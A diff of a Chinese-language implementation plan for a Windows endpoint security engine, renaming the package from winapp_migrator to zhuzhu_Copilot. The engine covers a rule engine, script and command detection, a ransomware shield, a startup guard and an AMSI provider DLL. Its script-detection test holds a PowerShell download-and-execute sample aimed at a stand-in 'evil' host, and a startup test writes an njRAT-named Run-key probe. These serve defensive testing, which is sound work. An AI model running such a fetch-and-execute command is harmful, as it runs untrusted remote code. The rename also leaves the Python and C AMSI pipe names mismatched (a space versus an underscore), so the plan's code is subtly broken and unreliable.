@@ -4,7 +4,7 @@
 
 **Goal:** 在现有静默安全底座上构建统一端点防护引擎 security\_engine：外置规则引擎 + 文件/脚本/命令智能识别（规则+可选LLM）+ 勒索实时防护盾 + 启动项实时防护 + 原生 AMSI Provider DLL，全部真实 API、零硬编码、分级自动处置。
 
-**Architecture:** 新建包 `src/winapp_migrator/core/security_engine/`，模块化检测器通过 `SecurityEngine` 统一事件流做置信度分级处置（高=自动隔离/终止，中=通知，低=仅审计日志）；规则库全部外置 `config/security_rules.json`（用户可覆盖 `%USERPROFILE%\.winapp_migrator\config\security_rules.json`）。AMSI 用原生 DLL（C）+ named pipe 与 Python 侧 `AmsiBridge` 判定。复用现有 `core/security.py` 隔离区与进程工具、`core/execution_guard.py` 命令工具。
+**Architecture:** 新建包 `src/zhuzhu_Copilot/core/security_engine/`，模块化检测器通过 `SecurityEngine` 统一事件流做置信度分级处置（高=自动隔离/终止，中=通知，低=仅审计日志）；规则库全部外置 `config/security_rules.json`（用户可覆盖 `%USERPROFILE%\.zhuzhu_Copilot\config\security_rules.json`）。AMSI 用原生 DLL（C）+ named pipe 与 Python 侧 `AmsiBridge` 判定。复用现有 `core/security.py` 隔离区与进程工具、`core/execution_guard.py` 命令工具。
 
 **Tech Stack:** Python 3.13（ctypes/winreg/pywin32/COM），C（MinGW/MSVC 编译 AMSI DLL），PyQt6（设置界面），项目现有 Cython 打包链。
 
@@ -14,7 +14,7 @@
 
 ```
 config/security_rules.json                          [新建] 默认规则库（规则+处置策略+阈值+可信签名者+勒索扩展名）
-src/winapp_migrator/core/security_engine/           [新建包]
+src/zhuzhu_Copilot/core/security_engine/           [新建包]
 ├── __init__.py                                     [新建] 包导出
 ├── rules.py                                        [新建] 规则引擎
 ├── file_intel.py                                   [新建] 文件静态分析（PE/熵/字符串）
@@ -30,8 +30,8 @@ build/amsi_provider/                                [新建]
 ├── amsi_provider.c                                 [新建] 原生 AMSI Provider DLL 源码
 ├── amsi_provider.def                               [新建] 导出表
 └── build_amsi.ps1                                  [新建] 编译脚本（gcc/cl 自动探测）
-src/winapp_migrator/ui/security_settings_dialog.py  [新建] 安全防护设置对话框
-src/winapp_migrator/ui/main_window.py               [修改] SecurityMonitorWorker 接入引擎 + 防护设置按钮
+src/zhuzhu_Copilot/ui/security_settings_dialog.py  [新建] 安全防护设置对话框
+src/zhuzhu_Copilot/ui/main_window.py               [修改] SecurityMonitorWorker 接入引擎 + 防护设置按钮
 scripts/_verify_rules_engine.py                     [新建]
 scripts/_verify_file_intel.py                       [新建]
 scripts/_verify_signature.py                        [新建]
@@ -64,9 +64,9 @@ sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."
 
 * Create: `config/security_rules.json`
 
-* Create: `src/winapp_migrator/core/security_engine/__init__.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/__init__.py`
 
-* Create: `src/winapp_migrator/core/security_engine/rules.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/rules.py`
 
 * Create: `scripts/_verify_rules_engine.py`
 
@@ -83,7 +83,7 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.rules import RuleEngine
+from zhuzhu_Copilot.core.security_engine.rules import RuleEngine
 
 eng = RuleEngine()
 check("默认规则库加载", len(eng._rules) >= 8, f"rules={len(eng._rules)}")
@@ -140,7 +140,7 @@ sys.exit(1 if FAILS else 0)
 * [ ] **Step 1.2: 运行验证（预期失败：模块不存在）**
 
 Run: `python scripts/_verify_rules_engine.py`
-Expected: 抛 `ModuleNotFoundError: No module named 'winapp_migrator.core.security_engine'`（FAIL）
+Expected: 抛 `ModuleNotFoundError: No module named 'zhuzhu_Copilot.core.security_engine'`（FAIL）
 
 * [ ] **Step 1.3: 创建默认规则库**
 
@@ -198,20 +198,20 @@ Expected: 抛 `ModuleNotFoundError: No module named 'winapp_migrator.core.securi
 
 * [ ] **Step 1.4: 创建包与规则引擎**
 
-`src/winapp_migrator/core/security_engine/__init__.py`：
+`src/zhuzhu_Copilot/core/security_engine/__init__.py`：
 
 ```python
 """安全防护引擎：端点防护（规则引擎/文件脚本命令识别/勒索盾/启动项防护/AMSI）"""
 ```
 
-`src/winapp_migrator/core/security_engine/rules.py`：
+`src/zhuzhu_Copilot/core/security_engine/rules.py`：
 
 ```python
 """规则引擎：加载外置规则库 security_rules.json，样本匹配返回命中规则与最高置信度。
 
 规则库路径解析：
 1. 内置默认: <项目根>/config/security_rules.json（打包后 _MEIPASS/config/security_rules.json）
-2. 用户覆盖: %USERPROFILE%\\.winapp_migrator\\config\\security_rules.json（顶层键合并覆盖内置）
+2. 用户覆盖: %USERPROFILE%\\.zhuzhu_Copilot\\config\\security_rules.json（顶层键合并覆盖内置）
 匹配器按类型注册式扩展（add_matcher），全部规则外置、零硬编码。
 """
 import json
@@ -221,9 +221,9 @@ import sys
 from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
-logger = __import__("winapp_migrator.utils.helpers", fromlist=["setup_logging"]).setup_logging()
+logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()
 
-_USER_RULES = Path(os.environ.get("USERPROFILE", str(Path.home()))) / ".winapp_migrator" / "config" / "security_rules.json"
+_USER_RULES = Path(os.environ.get("USERPROFILE", str(Path.home()))) / ".zhuzhu_Copilot" / "config" / "security_rules.json"
 
 _BASE64_SET = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
 _ALNUM_SET = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
@@ -397,7 +397,7 @@ Run: `python scripts/smoke_test.py`
 Expected: 现有回归通过
 
 ```powershell
-git add config/security_rules.json src/winapp_migrator/core/security_engine/__init__.py src/winapp_migrator/core/security_engine/rules.py scripts/_verify_rules_engine.py ; git commit -m "feat(security): 外置规则引擎与默认规则库（安全防护引擎A）"
+git add config/security_rules.json src/zhuzhu_Copilot/core/security_engine/__init__.py src/zhuzhu_Copilot/core/security_engine/rules.py scripts/_verify_rules_engine.py ; git commit -m "feat(security): 外置规则引擎与默认规则库（安全防护引擎A）"
 ```
 
 ***
@@ -406,7 +406,7 @@ git add config/security_rules.json src/winapp_migrator/core/security_engine/__in
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/file_intel.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/file_intel.py`
 
 * Create: `scripts/_verify_file_intel.py`
 
@@ -458,7 +458,7 @@ def make_test_pe(path):
         f.write(raw)
 
 
-from winapp_migrator.core.security_engine import file_intel
+from zhuzhu_Copilot.core.security_engine import file_intel
 
 tmp = tempfile.mkdtemp(prefix="fileintel_")
 try:
@@ -494,7 +494,7 @@ Expected: FAIL `ModuleNotFoundError`（模块未实现）
 
 * [ ] **Step 2.3: 实现 file\_intel**
 
-`src/winapp_migrator/core/security_engine/file_intel.py`：
+`src/zhuzhu_Copilot/core/security_engine/file_intel.py`：
 
 ```python
 """文件静态分析：SHA256 / PE 节区与导入表 / 信息熵 / 可打印字符串（纯标准库，真实文件读取）"""
@@ -658,7 +658,7 @@ Expected: 全部 PASS，退出码 0
 * [ ] **Step 2.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/file_intel.py scripts/_verify_file_intel.py ; git commit -m "feat(security): 文件静态分析模块（PE/熵/字符串）"
+git add src/zhuzhu_Copilot/core/security_engine/file_intel.py scripts/_verify_file_intel.py ; git commit -m "feat(security): 文件静态分析模块（PE/熵/字符串）"
 ```
 
 ***
@@ -667,7 +667,7 @@ git add src/winapp_migrator/core/security_engine/file_intel.py scripts/_verify_f
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/signature.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/signature.py`
 
 * Create: `scripts/_verify_signature.py`
 
@@ -684,8 +684,8 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.signature import signer_subject
-from winapp_migrator.core import security as _sec
+from zhuzhu_Copilot.core.security_engine.signature import signer_subject
+from zhuzhu_Copilot.core import security as _sec
 
 # Windows 系统自带签名文件的真实验证（kernel32.dll 恒为 Microsoft 签名）
 k32 = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "kernel32.dll")
@@ -715,7 +715,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 3.3: 实现 signature**
 
-`src/winapp_migrator/core/security_engine/signature.py`：
+`src/zhuzhu_Copilot/core/security_engine/signature.py`：
 
 ```python
 """Authenticode 签名验证与签发者提取（crypt32 CryptQueryObject，纯 ctypes，真实 API）"""
@@ -777,7 +777,7 @@ Expected: 全部 PASS（kernel32.dll 签名有效且签发者含 microsoft）
 * [ ] **Step 3.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/signature.py scripts/_verify_signature.py ; git commit -m "feat(security): 签名验证与签发者提取模块"
+git add src/zhuzhu_Copilot/core/security_engine/signature.py scripts/_verify_signature.py ; git commit -m "feat(security): 签名验证与签发者提取模块"
 ```
 
 ***
@@ -786,7 +786,7 @@ git add src/winapp_migrator/core/security_engine/signature.py scripts/_verify_si
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/script_intel.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/script_intel.py`
 
 * Create: `scripts/_verify_script_intel.py`
 
@@ -803,8 +803,8 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.rules import RuleEngine
-from winapp_migrator.core.security_engine.script_intel import analyze_script, obfuscation_ratio
+from zhuzhu_Copilot.core.security_engine.rules import RuleEngine
+from zhuzhu_Copilot.core.security_engine.script_intel import analyze_script, obfuscation_ratio
 
 eng = RuleEngine()
 mal = 'IEX (New-Object Net.WebClient).DownloadString("http://evil/a.ps1")'
@@ -838,7 +838,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 4.3: 实现 script\_intel**
 
-`src/winapp_migrator/core/security_engine/script_intel.py`：
+`src/zhuzhu_Copilot/core/security_engine/script_intel.py`：
 
 ```python
 """脚本分析：脚本文本 → 规则引擎（category=script），附加混淆启发式置信度加权"""
@@ -873,7 +873,7 @@ Expected: 全部 PASS
 * [ ] **Step 4.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/script_intel.py scripts/_verify_script_intel.py ; git commit -m "feat(security): 脚本分析模块（规则+混淆启发式）"
+git add src/zhuzhu_Copilot/core/security_engine/script_intel.py scripts/_verify_script_intel.py ; git commit -m "feat(security): 脚本分析模块（规则+混淆启发式）"
 ```
 
 ***
@@ -882,7 +882,7 @@ git add src/winapp_migrator/core/security_engine/script_intel.py scripts/_verify
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/llm_analyzer.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/llm_analyzer.py`
 
 * Create: `scripts/_verify_llm_analyzer.py`
 
@@ -901,7 +901,7 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.llm_analyzer import analyze, _parse
+from zhuzhu_Copilot.core.security_engine.llm_analyzer import analyze, _parse
 
 # 1) 关闭/缺配置 → 直接返回 None（不请求网络）
 check("未启用返回None", analyze({"a": 1}, {"enabled": False}) is None)
@@ -965,7 +965,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 5.3: 实现 llm\_analyzer**
 
-`src/winapp_migrator/core/security_engine/llm_analyzer.py`：
+`src/zhuzhu_Copilot/core/security_engine/llm_analyzer.py`：
 
 ```python
 """可选 LLM 深度分析：低置信度样本二次判定（OpenAI 兼容 /chat/completions，urllib 真实请求）
@@ -1048,7 +1048,7 @@ Expected: 全部 PASS
 * [ ] **Step 5.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/llm_analyzer.py scripts/_verify_llm_analyzer.py ; git commit -m "feat(security): 可选LLM深度分析模块（掉线自动降级）"
+git add src/zhuzhu_Copilot/core/security_engine/llm_analyzer.py scripts/_verify_llm_analyzer.py ; git commit -m "feat(security): 可选LLM深度分析模块（掉线自动降级）"
 ```
 
 ***
@@ -1057,7 +1057,7 @@ git add src/winapp_migrator/core/security_engine/llm_analyzer.py scripts/_verify
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/engine.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/engine.py`
 
 * Create: `scripts/_verify_engine.py`
 
@@ -1074,7 +1074,7 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.engine import SecurityEngine, _FILES_DIR, _AUDIT_DIR
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine, _FILES_DIR, _AUDIT_DIR
 
 # 1) 高置信度进程事件 → 自动终止真实子进程
 eng = SecurityEngine()
@@ -1146,7 +1146,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 6.3: 实现 engine**
 
-`src/winapp_migrator/core/security_engine/engine.py`：
+`src/zhuzhu_Copilot/core/security_engine/engine.py`：
 
 ```python
 """统一防护引擎：事件流 + 置信度分级处置 + 审计 + 隔离（复用 security.py 隔离区/进程工具）
@@ -1166,10 +1166,10 @@ import zipfile
 from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional
 
-from winapp_migrator.core import security as _sec
+from zhuzhu_Copilot.core import security as _sec
 from .rules import RuleEngine
 
-logger = __import__("winapp_migrator.utils.helpers", fromlist=["setup_logging"]).setup_logging()
+logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()
 
 _QROOT = _sec._QUARANTINE_ROOT
 _FILES_DIR = _QROOT / "files"      # 文件/目录隔离压缩包与元数据
@@ -1366,12 +1366,12 @@ class SecurityEngine:
 * [ ] **Step 6.4: 运行验证（预期全 PASS）**
 
 Run: `python scripts/_verify_engine.py`
-Expected: 全部 PASS。注意：本验证会向正式隔离目录 `ProgramData\WinAppMigrator\Quarantine` 写入测试产物，验证结束时恢复/删除测试文件完成自清理。
+Expected: 全部 PASS。注意：本验证会向正式隔离目录 `ProgramData\zhuzhu_Copilot\Quarantine` 写入测试产物，验证结束时恢复/删除测试文件完成自清理。
 
 * [ ] **Step 6.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/engine.py scripts/_verify_engine.py ; git commit -m "feat(security): 统一防护引擎（事件流/分级处置/隔离扩展/审计）"
+git add src/zhuzhu_Copilot/core/security_engine/engine.py scripts/_verify_engine.py ; git commit -m "feat(security): 统一防护引擎（事件流/分级处置/隔离扩展/审计）"
 ```
 
 ***
@@ -1380,7 +1380,7 @@ git add src/winapp_migrator/core/security_engine/engine.py scripts/_verify_engin
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/ransomware_shield.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/ransomware_shield.py`
 
 * Create: `scripts/_ransom_sim_child.py`
 
@@ -1429,8 +1429,8 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.engine import SecurityEngine
-from winapp_migrator.core.security_engine.ransomware_shield import RansomwareShield, default_protected_dirs
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
+from zhuzhu_Copilot.core.security_engine.ransomware_shield import RansomwareShield, default_protected_dirs
 
 check("默认保护目录解析", len(default_protected_dirs()) >= 1, str(default_protected_dirs()))
 
@@ -1473,7 +1473,7 @@ finally:
         pass
 
 # 恢复隔离文件（自清理）
-from winapp_migrator.core.security_engine.engine import _FILES_DIR
+from zhuzhu_Copilot.core.security_engine.engine import _FILES_DIR
 restored = eng.restore_quarantine_files() if hit else 0
 check("隔离文件可恢复", restored >= 1, f"restored={restored}")
 import shutil
@@ -1490,7 +1490,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 7.4: 实现 ransomware\_shield**
 
-`src/winapp_migrator/core/security_engine/ransomware_shield.py`：
+`src/zhuzhu_Copilot/core/security_engine/ransomware_shield.py`：
 
 ```python
 """勒索防护盾：ReadDirectoryChangesW 目录实时监控 + 批量改名/高熵写入检测 +
@@ -1510,7 +1510,7 @@ from typing import List, Optional
 
 from . import file_intel
 
-logger = __import__("winapp_migrator.utils.helpers", fromlist=["setup_logging"]).setup_logging()
+logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()
 
 FILE_LIST_DIRECTORY = 0x0001
 FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
@@ -1796,7 +1796,7 @@ Expected: 全部 PASS。若 "肇事件终止" 因 RM 归因失败而 miss（en v
 * [ ] **Step 7.6: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/ransomware_shield.py scripts/_ransom_sim_child.py scripts/_verify_ransomware_shield.py ; git commit -m "feat(security): 勒索防护盾（实时监控/行为检测/溯源隔离）"
+git add src/zhuzhu_Copilot/core/security_engine/ransomware_shield.py scripts/_ransom_sim_child.py scripts/_verify_ransomware_shield.py ; git commit -m "feat(security): 勒索防护盾（实时监控/行为检测/溯源隔离）"
 ```
 
 ***
@@ -1805,7 +1805,7 @@ git add src/winapp_migrator/core/security_engine/ransomware_shield.py scripts/_r
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/startup_guard.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/startup_guard.py`
 
 * Create: `scripts/_verify_startup_guard.py`
 
@@ -1822,9 +1822,9 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.engine import SecurityEngine
-from winapp_migrator.core.security_engine.startup_guard import StartupGuard
-from winapp_migrator.core import security as _sec
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
+from zhuzhu_Copilot.core.security_engine.startup_guard import StartupGuard
+from zhuzhu_Copilot.core import security as _sec
 
 RUN = r"Software\Microsoft\Windows\CurrentVersion\Run"
 BAD_NAME, BENIGN_NAME = "WmSeTest_njrat_probe", "WmSeTest_benign_probe"
@@ -1906,7 +1906,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 8.3: 实现 startup\_guard**
 
-`src/winapp_migrator/core/security_engine/startup_guard.py`：
+`src/zhuzhu_Copilot/core/security_engine/startup_guard.py`：
 
 ```python
 """启动项实时防护：注册表 Run/RunOnce 变更通知（RegNotifyChangeKeyValue）+
@@ -1923,7 +1923,7 @@ import winreg
 from pathlib import Path
 from typing import List
 
-from winapp_migrator.core import security as _sec
+from zhuzhu_Copilot.core import security as _sec
 from . import signature as _sig
 from .ransomware_shield import DirWatcher
 
@@ -2091,7 +2091,7 @@ Expected: 全部 PASS（HKCU 写权限即可，无需管理员）
 * [ ] **Step 8.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/startup_guard.py scripts/_verify_startup_guard.py ; git commit -m "feat(security): 启动项实时防护（注册表变更通知+文件夹监听+可信签名放行）"
+git add src/zhuzhu_Copilot/core/security_engine/startup_guard.py scripts/_verify_startup_guard.py ; git commit -m "feat(security): 启动项实时防护（注册表变更通知+文件夹监听+可信签名放行）"
 ```
 
 ***
@@ -2100,7 +2100,7 @@ git add src/winapp_migrator/core/security_engine/startup_guard.py scripts/_verif
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/command_intel.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/command_intel.py`
 
 * Create: `scripts/_verify_command_intel.py`
 
@@ -2117,8 +2117,8 @@ def check(name, cond, detail=""):
     if not cond:
         FAILS.append(name)
 
-from winapp_migrator.core.security_engine.engine import SecurityEngine
-from winapp_migrator.core.security_engine.command_intel import CommandIntel
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
+from zhuzhu_Copilot.core.security_engine.command_intel import CommandIntel
 
 eng = SecurityEngine()
 intel = CommandIntel(eng, poll_s=0.5)
@@ -2171,7 +2171,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 9.3: 实现 command\_intel**
 
-`src/winapp_migrator/core/security_engine/command_intel.py`：
+`src/zhuzhu_Copilot/core/security_engine/command_intel.py`：
 
 ```python
 """命令监控：Win32_ProcessStartTrace WMI 订阅（失败自动降级快照对比）+
@@ -2183,10 +2183,10 @@ from collections import deque
 from pathlib import Path
 from typing import Optional
 
-from winapp_migrator.core import security as _sec
-from winapp_migrator.core import execution_guard as _eg
+from zhuzhu_Copilot.core import security as _sec
+from zhuzhu_Copilot.core import execution_guard as _eg
 
-logger = __import__("winapp_migrator.utils.helpers", fromlist=["setup_logging"]).setup_logging()
+logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()
 
 
 class CommandIntel:
@@ -2294,7 +2294,7 @@ Expected: 全部 PASS
 * [ ] **Step 9.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/command_intel.py scripts/_verify_command_intel.py ; git commit -m "feat(security): 命令监控（WMI订阅+快照降级，复用执行防护规则）"
+git add src/zhuzhu_Copilot/core/security_engine/command_intel.py scripts/_verify_command_intel.py ; git commit -m "feat(security): 命令监控（WMI订阅+快照降级，复用执行防护规则）"
 ```
 
 ***
@@ -2303,7 +2303,7 @@ git add src/winapp_migrator/core/security_engine/command_intel.py scripts/_verif
 
 **Files:**
 
-* Create: `src/winapp_migrator/core/security_engine/amsi_bridge.py`
+* Create: `src/zhuzhu_Copilot/core/security_engine/amsi_bridge.py`
 
 * Create: `scripts/_verify_amsi_bridge.py`
 
@@ -2321,10 +2321,10 @@ def check(name, cond, detail=""):
         FAILS.append(name)
 
 import win32file, win32pipe
-from winapp_migrator.core.security_engine.engine import SecurityEngine
-from winapp_migrator.core.security_engine.amsi_bridge import (AmsiBridge, register_provider,
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
+from zhuzhu_Copilot.core.security_engine.amsi_bridge import (AmsiBridge, register_provider,
                                                               unregister_provider, is_registered)
-from winapp_migrator.utils.helpers import is_admin
+from zhuzhu_Copilot.utils.helpers import is_admin
 
 eng = SecurityEngine()
 bridge = AmsiBridge(eng)
@@ -2376,7 +2376,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 10.3: 实现 amsi\_bridge**
 
-`src/winapp_migrator/core/security_engine/amsi_bridge.py`：
+`src/zhuzhu_Copilot/core/security_engine/amsi_bridge.py`：
 
 ```python
 """AMSI 管道桥：原生 Provider DLL 通过 named pipe 投递脚本内容 → 规则引擎判定 → 回传结果。
@@ -2394,14 +2394,14 @@ import pywintypes
 import win32file
 import win32pipe
 
-PIPE_NAME = "WinAppMigratorAmsiPipe"
+PIPE_NAME = "zhuzhu CopilotAmsiPipe"
 PROVIDER_GUID = "{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}"
 _REG_PROVIDERS = r"SOFTWARE\Microsoft\AMSI\Providers" + "\\" + PROVIDER_GUID
 _REG_CLSID = r"SOFTWARE\Classes\CLSID" + "\\" + PROVIDER_GUID
 _REG_INPROC = _REG_CLSID + r"\InprocServer32"
 _HEADER = struct.Struct("<I")
 
-logger = __import__("winapp_migrator.utils.helpers", fromlist=["setup_logging"]).setup_logging()
+logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()
 
 
 class AmsiBridge:
@@ -2487,7 +2487,7 @@ def register_provider(dll_path: str) -> bool:
         winreg.SetValueEx(k, "", 0, winreg.REG_SZ, dll_path)
         winreg.CloseKey(k)
         k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, _REG_CLSID)
-        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "WinAppMigrator AMSI Provider")
+        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "zhuzhu Copilot AMSI Provider")
         winreg.CloseKey(k)
         k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, _REG_INPROC)
         winreg.SetValueEx(k, "", 0, winreg.REG_SZ, dll_path)
@@ -2524,7 +2524,7 @@ Expected: 全部 PASS
 * [ ] **Step 10.5: 提交**
 
 ```powershell
-git add src/winapp_migrator/core/security_engine/amsi_bridge.py scripts/_verify_amsi_bridge.py ; git commit -m "feat(security): AMSI管道桥（判定回传+注册表注册/反注册）"
+git add src/zhuzhu_Copilot/core/security_engine/amsi_bridge.py scripts/_verify_amsi_bridge.py ; git commit -m "feat(security): AMSI管道桥（判定回传+注册表注册/反注册）"
 ```
 
 ***
@@ -2546,7 +2546,7 @@ git add src/winapp_migrator/core/security_engine/amsi_bridge.py scripts/_verify_
 `build/amsi_provider/amsi_provider.c`：
 
 ```c
-/* WinAppMigrator AMSI Provider (native DLL)
+/* zhuzhu Copilot AMSI Provider (native DLL)
  * 只做投递：IAntimalwareProvider::Scan 读入脚本内容，经 named pipe 交主程序判定，
  * 超时/失败一律返回 CLEAN，绝不卡死宿主的脚本执行（AMSI Provider 强制性能要求）。
  */
@@ -2559,7 +2559,7 @@ git add src/winapp_migrator/core/security_engine/amsi_bridge.py scripts/_verify_
 #define PIPE_TIMEOUT_MS  1000
 #define PATH_BUF         2048
 
-static const WCHAR kPipeName[]  = L"\\\\.\\pipe\\WinAppMigratorAmsiPipe";
+static const WCHAR kPipeName[]  = L"\\\\.\\pipe\\zhuzhu_CopilotAmsiPipe";
 static const WCHAR kRegProviders[] = L"SOFTWARE\\Microsoft\\AMSI\\Providers\\{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}";
 static const WCHAR kRegClsid[]     = L"SOFTWARE\\Classes\\CLSID\\{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}";
 static const WCHAR kRegInproc[]    = L"SOFTWARE\\Classes\\CLSID\\{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}\\InprocServer32";
@@ -2826,7 +2826,7 @@ static void STDMETHODCALLTYPE Provider_DisplayName(void *This, LPWSTR *name) {
     (void)This;
     if (!name)
         return;
-    static const WCHAR kName[] = L"WinAppMigrator Security Engine";
+    static const WCHAR kName[] = L"zhuzhu Copilot Security Engine";
     *name = (LPWSTR)CoTaskMemAlloc(sizeof(kName));
     if (*name)
         memcpy(*name, kName, sizeof(kName));
@@ -2935,7 +2935,7 @@ HRESULT WINAPI DllRegisterServer(void) {
     if (reg_set(HKEY_LOCAL_MACHINE, kRegProviders, L"", path) != ERROR_SUCCESS)
         return E_FAIL;
     if (reg_set(HKEY_LOCAL_MACHINE, kRegClsid, L"",
-                L"WinAppMigrator AMSI Provider") != ERROR_SUCCESS)
+                L"zhuzhu Copilot AMSI Provider") != ERROR_SUCCESS)
         return E_FAIL;
     if (reg_set(HKEY_LOCAL_MACHINE, kRegInproc, L"", path) != ERROR_SUCCESS)
         return E_FAIL;
@@ -3026,9 +3026,9 @@ def skip(name, why):
     print("SKIP " + name + " :: " + why)
     SKIPS.append(name)
 
-from winapp_migrator.core.security_engine.engine import SecurityEngine
-from winapp_migrator.core.security_engine.amsi_bridge import AmsiBridge, is_registered
-from winapp_migrator.utils.helpers import is_admin
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
+from zhuzhu_Copilot.core.security_engine.amsi_bridge import AmsiBridge, is_registered
+from zhuzhu_Copilot.utils.helpers import is_admin
 
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 DLL = os.path.join(ROOT, "build", "amsi_provider", "amsi_provider.dll")
@@ -3112,11 +3112,11 @@ git add build/amsi_provider/ scripts/_verify_amsi_dll.py ; git commit -m "feat(s
 
 **Files:**
 
-* Create: `src/winapp_migrator/ui/security_settings_dialog.py`
+* Create: `src/zhuzhu_Copilot/ui/security_settings_dialog.py`
 
 * Create: `scripts/_verify_security_settings.py`
 
-* Modify: `src/winapp_migrator/ui/main_window.py`（imports、SecurityMonitorWorker、row3 按钮、\_on\_security\_result）
+* Modify: `src/zhuzhu_Copilot/ui/main_window.py`（imports、SecurityMonitorWorker、row3 按钮、\_on\_security\_result）
 
 * [ ] **Step 12.1: 写验证脚本（先失败）**
 
@@ -3134,8 +3134,8 @@ def check(name, cond, detail=""):
 
 from PyQt6.QtWidgets import QApplication
 from PyQt6.QtCore import QSettings
-from winapp_migrator.core.security_engine.engine import SecurityEngine
-from winapp_migrator.ui.security_settings_dialog import SecuritySettingsDialog, _load_list
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
+from zhuzhu_Copilot.ui.security_settings_dialog import SecuritySettingsDialog, _load_list
 
 app = QApplication.instance() or QApplication([])
 eng = SecurityEngine()
@@ -3152,7 +3152,7 @@ i = dlg.level_combo.findData("auto")
 dlg.level_combo.setCurrentIndex(i)
 dlg.llm_check.setChecked(True)
 dlg._save()
-s = QSettings("WinAppMigrator", "WinAppMigrator")
+s = QSettings("zhuzhu Copilot", "zhuzhu Copilot")
 saved = _load_list("security_protected_dirs", [])
 check("目录持久化", t1 in saved, str(saved))
 check("处置级别持久化", s.value("security_action_level") == "auto")
@@ -3183,7 +3183,7 @@ Expected: FAIL `ModuleNotFoundError`
 
 * [ ] **Step 12.3: 实现设置对话框**
 
-`src/winapp_migrator/ui/security_settings_dialog.py`：
+`src/zhuzhu_Copilot/ui/security_settings_dialog.py`：
 
 ```python
 """安全防护设置对话框：受保护目录/信任目录/处置级别/LLM 分析/AMSI Provider/规则库"""
@@ -3196,9 +3196,9 @@ from PyQt6.QtCore import QSettings
 from PyQt6.QtWidgets import (QCheckBox, QComboBox, QDialog, QFileDialog, QHBoxLayout,
                              QLabel, QListWidget, QMessageBox, QPushButton, QVBoxLayout)
 
-from winapp_migrator.core.security_engine import amsi_bridge
